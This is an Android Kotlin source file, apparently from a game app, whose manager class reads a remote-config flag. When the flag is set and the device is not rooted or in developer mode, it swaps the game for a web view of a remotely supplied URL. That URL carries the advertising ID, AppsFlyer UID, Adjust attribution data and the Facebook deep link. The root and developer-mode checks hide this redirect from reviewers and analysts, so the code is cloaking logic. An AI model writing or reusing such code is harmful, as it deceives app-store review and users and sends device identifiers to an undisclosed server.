package io.likes.library.managers

import android.content.Intent
import android.util.Base64
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import androidx.lifecycle.lifecycleScope
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustAttribution
import com.adjust.sdk.AdjustConfig
import com.adjust.sdk.LogLevel
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.onesignal.OneSignal
import io.likes.library.FormBuilder
import io.likes.library.MainView
import io.likes.library.callbacks.MainCallback
import io.likes.library.storage.persistroom.model.Model
import io.likes.library.utils.Utils
import io.likes.library.utils.Utils.encode
import io.likes.library.utils.Utils.getAdvId
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.zip
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine


@InternalCoroutinesApi
class MainManager(private val activity: AppCompatActivity) {


    fun initialize() {

        var remoteListenerCallback = activity as MainCallback

        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }


        Firebase.remoteConfig.setConfigSettingsAsync(configSettings)

        Firebase.remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->


            if (task.isSuccessful) {

                OneSignal.initWithContext(activity.applicationContext)
                OneSignal.setAppId(Firebase.remoteConfig.getString("onesignal"))




                when (Firebase.remoteConfig.getString("status")) {
                    "false" -> {

                        remoteListenerCallback.startGame()

                    }

                    "true" -> {


                        val list = FormBuilder.createRepoInstance(activity).getAllData()

                        if (list.isNotEmpty()) {

                            activity.startActivity(
                                Intent(activity, MainView::class.java).putExtra(
                                    "url",
                                    list.component1().link
                                )
                            )
                            activity.finish()

                        } else if (list.isEmpty()) {



                            //

                            if (Utils.isDeviceRooted || Utils.isDevMode(activity = activity)) {
                                remoteListenerCallback.startGame()
                            } else {

                                activity.lifecycleScope.launch(Dispatchers.IO) {

                                    setupMainCycle()

                                }
                            }



                        } else {



                            //isDeviceRooted || isDevMode(activity = activity)

                            if (Utils.isDeviceRooted || Utils.isDevMode(activity = activity)) {
                                remoteListenerCallback.startGame()
                            } else {

                                activity.lifecycleScope.launch(Dispatchers.IO) {

                                    setupMainCycle()

                                }
                            }




                        }






                    }

                }
            } else {

                remoteListenerCallback.startGame()

            }

        }

    }


    suspend fun setupMainCycle() {

        val resourceOneFlow = flow {

            emit(requestAppsData())
        }

        val resourceTwoFlow = flow {

            emit(requestDeep())
        }


        val requestsResultFlow = resourceOneFlow.zip(resourceTwoFlow) { data, deep ->


            if (deep != "null") {

                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {
                    appendQueryParameter("sub12", Utils.getAppBundle(activity))
                    appendQueryParameter("afToken", Firebase.remoteConfig.getString("apps"))
                    appendQueryParameter(
                        "afid",
                        AppsFlyerLib.getInstance().getAppsFlyerUID(activity)
                    )
                    appendQueryParameter("sub11", "facebook")
                    appendQueryParameter("media_source", "facebook")
                    appendQueryParameter("advertising_id", getAdvId(activity))

                }.toString() +  "&triger=${Utils.concatCampaign(deep)}"


            } else if (data.campaign != "null" && data.campaign != null) {

                var guid = UUID.randomUUID()
                Adjust.addSessionCallbackParameter("user_uuid", guid.toString())

                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {

                    appendQueryParameter("click_id", (activity.packageName+"-"+guid.toString()).encode())
                    appendQueryParameter("token", Firebase.remoteConfig.getString("adjust"))
                    appendQueryParameter("atribut", data.toString())




                }.toString()


            } else {

                var guid = UUID.randomUUID()
                Adjust.addSessionCallbackParameter("user_uuid", guid.toString())


                Firebase.remoteConfig.getString("links").toUri().buildUpon().apply {

                    appendQueryParameter("click_id", (activity.packageName+"-"+guid.toString()).encode())
                    appendQueryParameter("token", Firebase.remoteConfig.getString("adjust"))
                    appendQueryParameter("atribut", data.toString())



                }
            }

        }



        requestsResultFlow.collect { length ->

            Log.d("adjust", "$length links")

            FormBuilder.createRepoInstance(activity).insert(Model(1, length.toString()))

            activity.startActivity(
                Intent(activity, MainView::class.java).putExtra(
                    "url",
                    length.toString()
                )
            )
            activity.finish()

        }


    }


    @OptIn(ExperimentalCoroutinesApi::class)
    suspend fun requestAppsData(): AdjustAttribution =
        suspendCancellableCoroutine { cont ->
            GlobalScope.launch {
                cont.resume(getsPromt(activity))
            }


        }


    suspend fun getsPromt(activity: AppCompatActivity): AdjustAttribution = suspendCoroutine {

        val appToken = Firebase.remoteConfig.getString("adjust")
        val environment = AdjustConfig.ENVIRONMENT_PRODUCTION
        val config = AdjustConfig(activity.applicationContext, appToken, environment)
        config.setLogLevel(LogLevel.VERBOSE);



        config.setOnAttributionChangedListener { it2 ->

            Log.d("adjust", "$it2 atts")

            it.resume(it2)


        }

        Adjust.onCreate(config)
        Adjust.onResume()

    }

    suspend fun requestDeep(): String =
        suspendCancellableCoroutine { cont ->
            AppLinkData.fetchDeferredAppLinkData(activity) {


                if (it != null) {

                    cont.resume(it.targetUri.toString())

                } else {

                    cont.resume("null")

                }

            }
        }


}

